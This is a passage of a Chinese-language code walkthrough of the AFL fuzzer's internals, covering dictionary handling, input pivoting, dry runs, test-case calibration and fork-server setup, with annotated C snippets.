<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (i == len) <span class="keyword">return</span>;</span><br><span class="line"><span class="comment">/* Reject builtin interesting values. */</span></span><br><span class="line"><span class="keyword">if</span> (len == <span class="number">2</span>) &#123;</span><br><span class="line">  i = <span class="built_in">sizeof</span>(interesting_16) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> (i--) </span><br><span class="line">    <span class="keyword">if</span> (*((u16*)mem) == interesting_16[i] ||</span><br><span class="line">        *((u16*)mem) == <span class="built_in">SWAP16</span>(interesting_16[i])) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (len == <span class="number">4</span>) &#123;</span><br><span class="line">  i = <span class="built_in">sizeof</span>(interesting_32) &gt;&gt; <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">while</span> (i--) </span><br><span class="line">    <span class="keyword">if</span> (*((u32*)mem) == interesting_32[i] ||</span><br><span class="line">        *((u32*)mem) == <span class="built_in">SWAP32</span>(interesting_32[i])) <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>检查待添加的自动生成字典项是否与已经存在的字典项相匹配，以避免重复添加相同的字典项</strong></li>
<li>这段代码通过优化策略，避免了对所有已存在的字典项进行不必要的比较，而是通过比较待添加字典项的长度来减少实际比较的次数，提高了性能。这样可以有效地防止将相同的字典项重复添加到字典中</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Reject anything that matches existing extras. Do a case-insensitive</span></span><br><span class="line"><span class="comment">   match. We optimize by exploiting the fact that extras[] are sorted</span></span><br><span class="line"><span class="comment">   by size. */</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; extras_cnt; i++)</span><br><span class="line">  <span class="keyword">if</span> (extras[i].len &gt;= len) <span class="keyword">break</span>;</span><br><span class="line">  <span class="comment">// 找到第一个长度大于等于待添加字典项长度的索引 `i`。这是为了减少匹配的次数，因为已存在的字典项是按照长度排好序的。</span></span><br><span class="line"><span class="keyword">for</span> (; i &lt; extras_cnt &amp;&amp; extras[i].len == len; i++)</span><br><span class="line">  <span class="comment">// 然后，在找到的这个位置之后的一段连续长度相等的字典项中，继续循环遍历。这是因为 `extras[]` 是按长度从小到大排列的，所以这段连续长度相等的字典项必然是在相等长度的部分中。</span></span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">memcmp_nocase</span>(extras[i].data, mem, len)) <span class="keyword">return</span>;</span><br><span class="line">  <span class="comment">// 实现了不区分大小写的比较  如果发现有匹配的已存在字典项，则直接返回，不再添加重复的字典项</span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>标记自动生成字典项已更改</strong></li>
<li><code>auto_changed = 1;</code>：标记自动生成的字典项已经发生更改。</li>
<li>遍历<code>a_extras</code>数组，比较<code>memcmp_nocase(a_extras[i].data, mem, len)</code>, 如果相同，就将其<code>hit_cnt</code>值加一，这是代表在语料中被use的次数,然后跳转到<code>sort_a_extras</code></li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">extra_data</span> &#123;  </span><br><span class="line">u8 *data;                           <span class="comment">/* Dictionary token data    */</span>  </span><br><span class="line">u32 len;                            <span class="comment">/* Dictionary token length  */</span>  </span><br><span class="line">u32 hit_cnt;                        <span class="comment">/* Use count in the corpus  */</span> </span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="keyword">struct</span> <span class="title class_">extra_data</span>* a_extras;   <span class="comment">/* Automatically selected extras    */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Last but not least, check a_extras[] for matches. There are no</span></span><br><span class="line"><span class="comment">     guarantees of a particular sort order. */</span></span><br><span class="line">  auto_changed = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; a_extras_cnt; i++) &#123;</span><br><span class="line">  <span class="comment">// 通过循环遍历已存在的自动生成字典项数组 `a_extras[]`，检查是否有与待添加的字典项内容相匹配的项</span></span><br><span class="line">    <span class="keyword">if</span> (a_extras[i].len == len &amp;&amp; !<span class="built_in">memcmp_nocase</span>(a_extras[i].data, mem, len)) &#123;</span><br><span class="line">      a_extras[i].hit_cnt++;</span><br><span class="line">      <span class="comment">// 增加已存在字典项的命中计数，表示这个字典项被使用的次数增加了。</span></span><br><span class="line">      <span class="keyword">goto</span> sort_a_extras; <span class="comment">// 该标签用于在后续的排序操作中对自动生成字典项数组 `a_extras[]` 进行排序</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>将新的自动生成的字典项添加到 <code>a_extras[]</code> 数组中，管理这个数组的容量</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* At this point, looks like we&#x27;re dealing with a new entry. So, let&#x27;s</span></span><br><span class="line"><span class="comment">   append it if we have room. Otherwise, let&#x27;s randomly evict some other</span></span><br><span class="line"><span class="comment">   entry from the bottom half of the list. */</span></span><br><span class="line"><span class="keyword">if</span> (a_extras_cnt &lt; MAX_AUTO_EXTRAS) &#123;</span><br><span class="line"><span class="comment">// 首先，检查已存在的自动生成字典项的数量是否还未达到最大容量 `MAX_AUTO_EXTRAS`</span></span><br><span class="line">  a_extras = <span class="built_in">ck_realloc_block</span>(a_extras, (a_extras_cnt + <span class="number">1</span>) * <span class="built_in">sizeof</span>(<span class="keyword">struct</span> extra_data));</span><br><span class="line">  a_extras[a_extras_cnt].data = <span class="built_in">ck_memdup</span>(mem, len);</span><br><span class="line">  a_extras[a_extras_cnt].len  = len;</span><br><span class="line">  a_extras_cnt++;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123; <span class="comment">// 如果数组已经达到最大容量</span></span><br><span class="line">  i = MAX_AUTO_EXTRAS / <span class="number">2</span> + <span class="built_in">UR</span>((MAX_AUTO_EXTRAS + <span class="number">1</span>) / <span class="number">2</span>);</span><br><span class="line">  <span class="comment">// 随机选择数组的底部一半中的一个项进行替换</span></span><br><span class="line">  <span class="built_in">ck_free</span>(a_extras[i].data);</span><br><span class="line">  a_extras[i].data    = <span class="built_in">ck_memdup</span>(mem, len); <span class="comment">// 将新的字典项内容复制到被替换的位置中。</span></span><br><span class="line">  a_extras[i].len     = len;</span><br><span class="line">  a_extras[i].hit_cnt = <span class="number">0</span>; <span class="comment">// 将命中计数重置为 0，因为这是一个新的项。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>标签<code>sort_a_extras</code> 对 <code>a_extras[]</code> 数组中的自动生成字典项进行排序</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">compare_extras_use_d</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* p1, <span class="type">const</span> <span class="type">void</span>* p2)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">extra_data</span> *e1 = (<span class="keyword">struct</span> extra_data*)p1,</span><br><span class="line">                    *e2 = (<span class="keyword">struct</span> extra_data*)p2;</span><br><span class="line">  <span class="keyword">return</span> e2-&gt;hit_cnt - e1-&gt;hit_cnt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First, sort all auto extras by use count, descending order. */</span></span><br><span class="line">  <span class="built_in">qsort</span>(a_extras, a_extras_cnt, <span class="built_in">sizeof</span>(<span class="keyword">struct</span> extra_data),</span><br><span class="line">        compare_extras_use_d);</span><br><span class="line">  <span class="comment">// 使用 C 语言标准库中的 `qsort()` 函数对 `a_extras[]` 数组中的自动生成字典项按照使用计数（`hit_cnt`）进行降序排序</span></span><br><span class="line">  <span class="comment">// a_extras：待排序数组的首元素地址。</span></span><br><span class="line">  <span class="comment">// a_extras_cnt：数组中元素的数量。</span></span><br><span class="line">  <span class="comment">// sizeof(struct extra_data)：每个元素的大小，用于计算排序时每次移动的字节数。</span></span><br><span class="line">  <span class="comment">// compare_extras_use_d：用于比较两个元素大小关系的比较函数，这里使用的是按照使用计数降序排列。</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">compare_extras_len</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* p1, <span class="type">const</span> <span class="type">void</span>* p2)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">extra_data</span> *e1 = (<span class="keyword">struct</span> extra_data*)p1,</span><br><span class="line">                    *e2 = (<span class="keyword">struct</span> extra_data*)p2;</span><br><span class="line">  <span class="keyword">return</span> e1-&gt;len - e2-&gt;len;</span><br><span class="line">&#125;</span><br><span class="line">  <span class="comment">/* Then, sort the top USE_AUTO_EXTRAS entries by size. */</span></span><br><span class="line">  <span class="built_in">qsort</span>(a_extras, <span class="built_in">MIN</span>(USE_AUTO_EXTRAS, a_extras_cnt),</span><br><span class="line">        <span class="built_in">sizeof</span>(<span class="keyword">struct</span> extra_data), compare_extras_len);</span><br><span class="line">    <span class="comment">// 这次是按照字典项长度进行排序，但只对数组中前 `USE_AUTO_EXTRAS=50` 个元素进行排序</span></span><br><span class="line">    <span class="comment">// 这是因为在之前的排序中，数组已经按照使用计数进行了排序，现在只需要对其中最重要的一部分元素按照长度排序即可。</span></span><br></pre></td></tr></table></figure>

<h4 id="pivot-inputs"><a href="#pivot-inputs" class="headerlink" title="pivot_inputs"></a>pivot_inputs</h4><ul>
<li>函数负责将输入测试用例文件重新命名、链接（或拷贝）到输出目录中，并在需要的情况下更新文件名以及关联的信息。这有助于模糊测试过程的组织和恢复</li>
<li>逻辑上说这个函数就是为<code>inputdir</code>里的<code>testcase</code>，在<code>output dir</code>里创建<code>hard link</code><ul>
<li>初始化<code>id=0</code></li>
<li>依次遍历queue里的queue_entry<ul>
<li><code>u8  *nfn, *rsl = strrchr(q-&gt;fname, &#39;/&#39;);</code></li>
<li><code>q-&gt;fname   /home/wutang/Desktop/fuzz_test/fuzz_input/1</code></li>
<li><code>if (!rsl) rsl = q-&gt;fname; else rsl++;</code><ul>
<li>rsl 变成 <code>1</code></li>
</ul>
</li>
<li>将rsl的前三个字节和<code>id:</code>进行比较<ul>
<li>如果相等，则设置<code>resuming_fuzz</code>为1,然后做一些恢复操作，不叙述。<ul>
<li>赋值 orig_id  为  <code>id:123</code>的123</li>
<li>…</li>
</ul>
</li>
<li>如果不相等<ul>
<li>在rsl里寻找<code>,orig:</code>子串，如果找到了，将use_name指向该子串的冒号后的名字；如果没找到，就另<code>use_name = rsl</code></li>
<li><code>nfn = alloc_printf(&quot;%s/queue/id:%06u,orig:%s&quot;, out_dir, id, use_name);</code></li>
<li><code>nfn   /home/wutang/Desktop/fuzz_test/fuzz_output/fuzzer1/queue/id:000000,orig:1</code></li>
</ul>
</li>
</ul>
</li>
<li>尝试创建从<code>q-&gt;fname</code> 到 <code>nfn</code> 的硬链接   <code>link_or_copy(q-&gt;fname, nfn);</code><ul>
<li>可能性执行链接（link）或者拷贝（copy）操作，将一个文件从一个路径复制到另一个路径</li>
<li>&#96;&#96;c_link_copy</li>
</ul>
</li>
<li>修改q的 <code>fname</code> 指向这个硬链接 <code>nfn</code></li>
<li>如果q的<code>passed_det</code>为1，则<code>mark_as_det_done(q)</code>,这主要是对应上面的 <code>resuming_fuzz</code>的情况。<ul>
<li>mark_as_det_done简单的说就是打开<code>out_dir/queue/.state/deterministic_done/use_name</code>这个文件，如果不存在就创建这个文件，然后设置q的passed_det为1。</li>
<li>这里的<code>use_name就是orig:后面的字符串</code></li>
</ul>
</li>
</ul>
</li>
<li>如果设置了<code>-i -</code> 也就是 <code>in_place_resume</code> 为1，则 <code>nuke_resume_dir()</code><ul>
<li><code>nuke_resume_dir()</code><ul>
<li>删除<code>out_dir/_resume/.state/deterministic_done</code>文件夹下所有<code>id:</code>前缀的文件</li>
<li>删除<code>out_dir/_resume/.state/auto_extras</code>文件夹下所有<code>auto_</code>前缀的文件</li>
<li>删除<code>out_dir/_resume/.state/redundant_edges</code>文件夹下所有<code>id:</code>前缀的文件</li>
<li>删除<code>out_dir/_resume/.state/variable_behavior</code>文件夹下所有<code>id:</code>前缀的文件</li>
<li>删除文件夹<code>out_dir/_resume/.state</code></li>
<li>删除<code>out_dir/_resume</code>文件夹下所有<code>id:</code>前缀的文件</li>
<li>如果全部删除成功就正常返回，如果有某一个删除失败就抛出异常。</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="load-extras"><a href="#load-extras" class="headerlink" title="load_extras"></a>load_extras</h4><ul>
<li>这段代码负责加载额外的字典文件（extra dictionary）并对其进行排序，使其按照字典条目的大小进行排列</li>
<li>如果定义了extras_dir，则从extras_dir读取extras到extras数组里，并按size排序。<ul>
<li><code>-x @123</code> 表示要提取字典级别（level），并将 <code>@</code> 之后的数字解析为字典级别 <code>dict_level</code>。</li>
<li>打开目录 <code>dir</code>，使用 <code>opendir</code> 函数。<ul>
<li>如果打开目录失败，首先检查错误类型。<ul>
<li>如果错误是 <code>ENOTDIR</code>，则表示 <code>dir</code> 不是一个目录，可能是一个文件路径，因此尝试以文件方式加载字典文件，跳转到 <code>load_extras_file</code> 进行处理。<ul>
<li><code>goto check_and_sort;</code>之后退出循环</li>
</ul>
</li>
<li>如果不是 <code>ENOTDIR</code> 错误，而是其他错误，使用 <code>PFATAL</code> 报错，指示无法打开目录</li>
</ul>
</li>
<li>如果 <code>x</code> 存在（之前解析了字典级别），则报错，因为当前版本不支持目录级别的字典文件。</li>
<li>如果打开目录成功<ul>
<li>遍历目录文件<ul>
<li>过滤 <code>.</code> or <code>..</code></li>
<li>大小大雨 MAX_DICT_FILE 128  ，用 <code>FATAL</code> 报错，指示该额外字典文件过大。</li>
</ul>
</li>
<li>跟踪最小和最大字典文件大小，以便在之后显示有关额外字典文件的信息</li>
<li>为 <code>extras</code> 数组分配更多的内存以容纳新的字典文件。<ul>
<li>分配足够的内存来存储字典文件的内容，并将大小设置为文件大小。</li>
</ul>
</li>
<li>增加 <code>extras_cnt</code> 计数器，表示已加载的额外字典文件数量</li>
</ul>
</li>
<li><code>check_and_sort</code><ul>
<li>使用 <code>qsort</code> 对 <code>extras</code> 数组中的字典文件进行按照大小排序。</li>
<li>如果最大字典条目大小超过 32，使用 <code>WARNF</code> 发出警告，建议考虑裁剪字典条目。</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="find-timeout"><a href="#find-timeout" class="headerlink" title="find_timeout"></a>find_timeout</h4><ul>
<li>这段代码的作用是用于寻找之前会话中的超时设置，并将其应用于当前会话。主要用于在恢复会话时，不希望超时设置重复地自动进行缩放，以防止由于随机因素而导致超时设置不断增大</li>
<li>如果 <code>timeout_given</code> 没有被设置，则进入find_timeout<ul>
<li>这个想法是，在不指定 <code>-t</code> 的情况下 <code>resuming sessions</code> 时，我们不希望一遍又一遍地自动调整超时时间，以防止超时值因随机波动而增长</li>
<li>如果 <code>resuming_fuzz</code> 为0，则直接 return ,不需要恢复</li>
<li>如果 <code>in_place_resume</code> 为1，则<code>fn = alloc_printf(&quot;%s/fuzzer_stats&quot;, out_dir);</code>，否则<code>fn = alloc_printf(&quot;%s/../fuzzer_stats&quot;, in_dir);</code></li>
<li>以只读方式打开fd，读取内容到<code>tmp[4096]</code>里，并在里面搜索 <code>exec_timeout :</code> ，如果搜索不到就直接返回，如果搜索到了，就读取这个timeout的数值，如果大于4就设置为exec_tmout的值。<ul>
<li><code>EXP_ST u32 exec_tmout = EXEC_TIMEOUT; /* Configurable exec timeout (ms) */</code></li>
</ul>
</li>
<li><code>timeout_given = 3;</code><ul>
<li><code>timeout_given, /* Specific timeout given? */</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="detect-file-args"><a href="#detect-file-args" class="headerlink" title="detect_file_args"></a>detect_file_args</h4><ul>
<li>这个函数其实就是识别参数里面有没有<code>@@</code>，如果有就替换为<code>out_dir/.cur_input</code>，如果没有就返回<ul>
<li>替换为 <code>/home/wutang/Desktop/fuzz_test/fuzz_output/fuzzer1/.cur_input</code></li>
</ul>
</li>
</ul>
<h4 id="setup-stdio-file"><a href="#setup-stdio-file" class="headerlink" title="setup_stdio_file"></a>setup_stdio_file</h4><ul>
<li>如果out_file为NULL ， 如果没有使用-f  &amp;&amp; 或者没有指定 <code>@@</code>，就删除原本的<code>out_dir/.cur_input</code>，创建一个新的<code>out_dir/.cur_input</code>，保存其文件描述符在out_fd中</li>
</ul>
<h4 id="check-binary"><a href="#check-binary" class="headerlink" title="check_binary"></a>check_binary</h4><ul>
<li>这段代码用于验证目标二进制文件的合法性和是否进行了适当的 AFL 仪表插装（instrumentation）。具体来说，它检查二进制文件是否存在、是否为可执行文件、是否为 ELF 或 Mach-O 格式，是否包含 AFL 仪表插装标记，以及其他相关特征。<ul>
<li><code>/home/wutang/Desktop/google_afl/llvm_mode/test-instr</code></li>
<li>可以指定 <code>AFL_SKIP_BIN_CHECK</code> 跳过check</li>
<li>…</li>
</ul>
</li>
<li>check指定路径处要执行的程序是否存在，且它不能是一个shell script</li>
</ul>
<h4 id="perform-dry-run"><a href="#perform-dry-run" class="headerlink" title="perform_dry_run"></a>perform_dry_run</h4><h5 id="输入参数"><a href="#输入参数" class="headerlink" title="输入参数"></a>输入参数</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">/home/wutang/Desktop/google_afl/llvm_mode/test-instr /home/wutang/Desktop/fuzz_test/fuzz_output/fuzzer1/.cur_input</span><br></pre></td></tr></table></figure>

<h5 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h5><ul>
<li>确认目标应用程序是否按预期工作。干扰运行是在初始的输入测试用例上进行的，用于验证应用程序在不进行实际变异的情况下是否会崩溃、超时或产生其他异常行为。</li>
<li>执行所有的测试用例，以检查是否按预期工作<ul>
<li>读取环境变量 <code>AFL_SKIP_CRASHES</code> 到<code>skip_crashes</code>，设置cal_failures为0</li>
<li>遍历queue<ul>
<li>打开q-&gt;fname，并读取到分配的内存use_mem里</li>
<li><code>/home/wutang/Desktop/fuzz_test/fuzz_output/fuzzer1/queue/id:000000,orig:1</code></li>
<li><code>res = calibrate_case(argv, q, use_mem, 0, 1);</code><ul>
<li>校准测试用例 [[#u8 calibrate_case(char **argv, struct queue_entry *q, u8 *use_mem, u32 handicap, u8 from_queue)]] 返回res</li>
</ul>
</li>
<li>如果<code>stop_soon</code>被置为1，就直接return</li>
<li>如果res的结果为<code>crash_mode</code>或者<code>FAULT_NOBITS</code><ul>
<li>打印<code>SAYF(&quot;len = %u, map size = %u, exec speed = %llu us\n&quot;, q-&gt;len, q-&gt;bitmap_size, q-&gt;exec_us);</code></li>
<li>比如 <code>len = 4, map size = 2, exec speed = 3237980 us</code></li>
</ul>
</li>
<li>依据res的结果查看是哪种错误并进行判断。一共有以下几种错误类型<ul>
<li>FAULT_NONE<ul>
<li>如果q是头结点，即第一个测试用例，则<code>check_map_coverage</code>，用以评估map coverage [[#void check_map_coverage(void)]] 测试覆盖率低直接告警<ul>
<li>检查覆盖率地图（coverage map）的覆盖情况。覆盖率地图是记录在模糊测试中哪些代码路径被执行过的数据结构</li>
<li>计数trace_bits发现的路径数，如果小于100，就直接返回</li>
<li>在trace_bits的数组后半段，如果有值就直接返回。</li>
<li>抛出警告<code>WARNF(&quot;Recompile binary with newer version of afl to improve coverage!&quot;)</code></li>
</ul>
</li>
<li>设置<code>-C</code> 也就是设置crash_mode为<code>FAULT_CRASH</code>则抛出异常，<code>FATAL(&quot;Test case &#39;%s&#39; does *NOT* crash&quot;, fn);</code>，该文件不崩溃</li>
</ul>
</li>
<li>FAULT_TMOUT<ul>
<li>如果指定了-t参数，<code>-t 360000+</code>则timeout_given值为2<ul>
<li>抛出警告<code>WARNF(&quot;Test case results in a timeout (skipping)&quot;);</code>，并设置q的cal_failed为CAL_CHANCES，cal_failures计数器加一。</li>
</ul>
</li>
</ul>
</li>
<li>FAULT_CRASH<ul>
<li>设置<code>-Q</code> 会设置 <code>mem_limit</code>, 判断是否指定<code>mem_limit</code>，给出不同的内存的建议</li>
<li>但不管指定了还是没有，都会抛出异常<code>FATAL(&quot;Test case &#39;%s&#39; results in a crash&quot;, fn);</code></li>
</ul>
</li>
<li>FAULT_ERROR<ul>
<li>抛出异常<code>Unable to execute target application</code></li>
</ul>
</li>
<li>FAULT_NOINST<ul>
<li>这个样例运行没有出现任何路径信息，抛出异常<code>No instrumentation detected</code></li>
</ul>
</li>
<li>FAULT_NOBITS<ul>
<li>如果这个样例有出现路径信息，但是没有任何新路径，抛出警告<code>WARNF(&quot;No new instrumentation output, test case may be useless.&quot;)</code>，认为这是无用路径。useless_at_start计数器加一</li>
</ul>
</li>
</ul>
</li>
<li>如果这个样例q的var_behavior为真，则代表它多次运行，同样的输入条件下，却出现不同的覆盖信息。<ul>
<li>抛出警告<code>WARNF(&quot;Instrumentation output varies across runs.&quot;);</code>，代表这个样例的路径输出可变</li>
</ul>
</li>
<li>然后读取下一个queue，继续测试，直到结束。</li>
</ul>
</li>
</ul>
</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> &#123;  </span><br><span class="line"><span class="comment">/* 00 */</span> FAULT_NONE,  </span><br><span class="line"><span class="comment">/* 01 */</span> FAULT_TMOUT,  </span><br><span class="line"><span class="comment">/* 02 */</span> FAULT_CRASH,  </span><br><span class="line"><span class="comment">/* 03 */</span> FAULT_ERROR,  </span><br><span class="line"><span class="comment">/* 04 */</span> FAULT_NOINST,  </span><br><span class="line"><span class="comment">/* 05 */</span> FAULT_NOBITS </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="u8-calibrate-case-char-argv-struct-queue-entry-q-u8-use-mem-u32-handicap-u8-from-queue"><a href="#u8-calibrate-case-char-argv-struct-queue-entry-q-u8-use-mem-u32-handicap-u8-from-queue" class="headerlink" title="u8 calibrate_case(char **argv, struct queue_entry *q, u8 *use_mem, u32 handicap, u8 from_queue)"></a>u8 calibrate_case(char **argv, struct queue_entry *q, u8 *use_mem, u32 handicap, u8 from_queue)</h4><ul>
<li>对一个新的测试用例进行校准（calibration）。校准是为了验证测试用例的执行结果，确认应用程序的行为，同时检测出变量行为等情况。</li>
<li>这个函数评估input文件夹下的case，来发现这些testcase的行为是否异常；以及在发现新的路径时，用以评估这个新发现的testcase的行为是否是可变（这里的可变是指多次执行这个case，发现的路径不同）等等<ul>
<li>创建<code>first_trace[MAP_SIZE]</code></li>
<li>如果<code>q-&gt;exec_cksum</code>为0，代表这是这个case第一次运行，即来自input文件夹下，所以将first_run置为1。</li>
<li>保存原有的stage_cur、stage_max、stage_name</li>
<li>设置use_tmout为exec_tmout,如果from_queue是0或者resuming_fuzz被置为1，即代表不来自于queue中或者在resuming sessions的时候，则use_tmout的值被设置的更大。</li>
<li><code>q-&gt;cal_failed++</code></li>
<li>设置stage_name为”calibration”,以及根据是否fast_cal为1，来设置stage_max的值为3还是CAL_CYCLES(默认为8)，含义是每个新测试用例（以及显示出可变行为的测试用例）的校准周期数，也就是说这个stage要执行几次的意思。</li>
<li>如果当前不是以dumb mode运行，且no_forkserver（禁用forkserver）为0，且forksrv_pid为0，则<ul>
<li><code>init_forkserver(argv)</code>启动fork server  [[#init_forkserver]]</li>
</ul>
</li>
<li>如果<strong>这个queue不是来自input文件夹，而是评估新case</strong>，则此时<code>q-&gt;exec_cksum</code>不为空，拷贝trace_bits到first_trace里，然后计算<code>has_new_bits</code>的值，赋值给new_bits。<ul>
<li>[[#has_new_bits(u8 *virgin_map)]]</li>
</ul>
</li>
<li>开始执行<code>calibration stage</code>，共执行stage_max循环<ul>
<li>如果<strong>这个queue不是来自input文件夹，而是评估新case</strong>，且第一轮calibration stage执行结束时，刷新一次展示界面<code>show_stats</code>，用来展示这次执行的结果，此后不再展示。</li>
<li><code>write_to_testcase(use_mem, q-&gt;len)</code><ul>
<li>将从<code>q-&gt;fname</code>中读取的内容写入到<code>.cur_input</code>中</li>
<li>[[#void write_to_testcase(void *mem, u32 len)]]</li>
</ul>
</li>
<li><code>u8 run_target(argv, use_tmout)</code>,通过Fork-server 开始fork出子进程进进行fuzz, <strong>对trace_bits进行赋值</strong>，运行目标应用程序并监控是否超时，返回运行结果的状态信息<ul>
<li>[[#u8 run_target(char **argv, u32 timeout)]]  返回res</li>
</ul>
</li>
<li>如果这是<code>calibration stage</code>第一次运行，且不在<code>dumb_mode</code>，且共享内存里没有任何路径（即没有任何byte被置位），设置fault为<code>FAULT_NOINST</code>,然后<code>goto abort_calibration</code><ul>
<li>计算共享内存里有多少字节被置位了,通过count_bytes函数。 计算在位图中设置为1的字节数量的函数, 验证 0x4000 字节的数据<ul>
<li>[[#u32 count_bytes(u8 *mem)]]</li>
</ul>
</li>
</ul>
</li>
<li>计算<code>hash32(trace_bits, MAP_SIZE, HASH_CONST)</code>的结果，其值为一个32位uint值，保存到cksum中.计算长度为2的16次方hash<ul>
<li>[[#inline u32 hash32(const void* key, u32 len, u32 seed)]]</li>
</ul>
</li>
<li>如果<code>q-&gt;exec_cksum</code>不等于cksum，即代表<strong>这是第一次运行，或者在相同的参数下，每次执行，cksum却不同，是一个路径可变的queue</strong><ul>
<li><code>hnb = has_new_bits(virgin_bits)</code>  [[#char has_new_bits(u8 *virgin_map)]] 目的是检查当前执行路径是否带来了新的信息（新的位）。它会更新”virgin_map”以反映新发现的位，并返回不同的值来表示发现的情况</li>
<li>如果hnb大于new_bits，设置new_bits的值为hnb</li>
<li>如果<code>q-&gt;exec_cksum</code>不等于0，即代表这是判断是否是可变queue<ul>
<li>i从0到MAP_SIZE遍历，如果 <code>first_trace[i]</code> 不等于 <code>trace_bits[i]</code> ，<strong>代表发现了可变queue</strong>，且var_bytes为空，则将该字节设置为1，并将stage_max设置为<code>CAL_CYCLES_LONG</code>，即需要执行40次。</li>
<li>将var_detected设置为1</li>
</ul>
</li>
<li>否则，即<code>q-&gt;exec_cksum</code>等于0，即代表这是第一次执行这个queue<ul>
<li>设置<code>q-&gt;exec_cksum</code>的值为之前计算出来的本次执行的cksum</li>
<li>拷贝trace_bits到first_trace中。</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>保存所有轮次总的执行时间，加到 <code>total_cal_us</code> 里，总的执行轮次，加到 <code>total_cal_cycles</code> 里</li>
<li>计算出一些统计信息，包括<ul>
<li>计算出单次执行时间的平均值保存到<code>q-&gt;exec_us</code>里</li>
<li>将最后一次执行所覆盖到的路径数保存到<code>q-&gt;bitmap_size</code>里</li>
<li><code>q-&gt;handicap = handicap;</code></li>
<li><code>q-&gt;cal_failed = 0;</code></li>
<li>total_bitmap_size里加上这个queue所覆盖到的路径数</li>
<li>total_bitmap_entries++</li>
<li>[[#update_bitmap_score(struct queue_entry *q)]] 更新路径的评分，以便确定哪些路径是更有利于模糊测试的</li>
<li>如果fault为<code>FAULT_NONE</code>，且该queue是第一次执行，且不属于<code>dumb_mode</code>，而且<code>new_bits</code>为0，<strong>代表在这个样例所有轮次的执行里，都没有发现任何新路径和出现异常</strong>，设置fault为<code>FAULT_NOBITS</code></li>
</ul>
</li>
<li>如果new_bits为2，且<code>q-&gt;has_new_cov</code>为0，设置其值为1，并将queued_with_cov加一，<strong>代表有一个queue发现了新路径</strong>。</li>
<li>如果这个queue是可变路径，即<code>var_detected</code>为1，则计算<code>var_bytes</code>里被置位的tuple个数，保存到<code>var_byte_count</code>里，代表这些tuple具有可变的行为。<ul>
<li>将这个queue标记为一个variable<ul>
<li><code>mark_as_variable(struct queue_entry *q)</code><ul>
<li>创建符号链接<code>out_dir/queue/.state/variable_behavior/fname</code></li>
<li>设置queue的var_behavior为1</li>
</ul>
</li>
<li>计数variable behavior的计数器<code>queued_variable</code>的值加一</li>
</ul>
</li>
</ul>
</li>
<li>恢复之前的stage值</li>
<li>如果不是第一次运行这个queue，展示<code>show_stats</code></li>
<li>返回fault的值</li>
</ul>
</li>
</ul>
<h4 id="init-forkserver"><a href="#init-forkserver" class="headerlink" title="init_forkserver"></a>init_forkserver</h4><ul>
<li>建立管道<code>st_pipe</code>传递状态和<code>ctl_pipe</code> 传递命令，在父子进程之间，是通过管道进行通信<ul>
<li>在继续往下读之前需要仔细阅读这篇文章</li>
<li><a href="https://zhuanlan.zhihu.com/p/58489873">Linux 的进程间通信：管道</a><ul>
<li><a href="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-07-22-145348.jpg"><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-07-22-145348.jpg"></a></li>
<li>我们也可以理解为，管道本质上就是一个文件，前面的进程以写方式打开文件，后面的进程以读方式打开。这样前面写完后面读，于是就实现了通信。</li>
<li>&#96;&#96;linux_mkfifo_mknod_pipe</li>
</ul>
</li>
</ul>
</li>
<li>fork出一个子进程，fork函数执行完毕后，如果创建新进程成功，则出现两个进程，一个是子进程，一个是父进程。在子进程中，fork函数返回0，在父进程中，fork返回新创建子进程的进程ID。我们可以通过fork返回的值来判断当前进程是子进程还是父进程。<ul>
<li><code>forksrv_pid = fork()</code></li>
</ul>
</li>
<li>子进程和父进程都会向下执行，我们通过pid来使它们执行不同的代码<code>if(!forksrv_pid)</code><ul>
<li>以下都是子进程要执行的代码<ul>
<li>在继续向下读之前，需要仔细阅读这篇文章<ul>
<li><a href="https://www.cnblogs.com/GODYCA/archive/2013/01/05/2846197.html">进程间通信管道进阶篇：linux下dup&#x2F;dup2函数的用法</a></li>
<li>&#96;&#96;linux_dup_dup2</li>
</ul>
</li>
</ul>
</li>
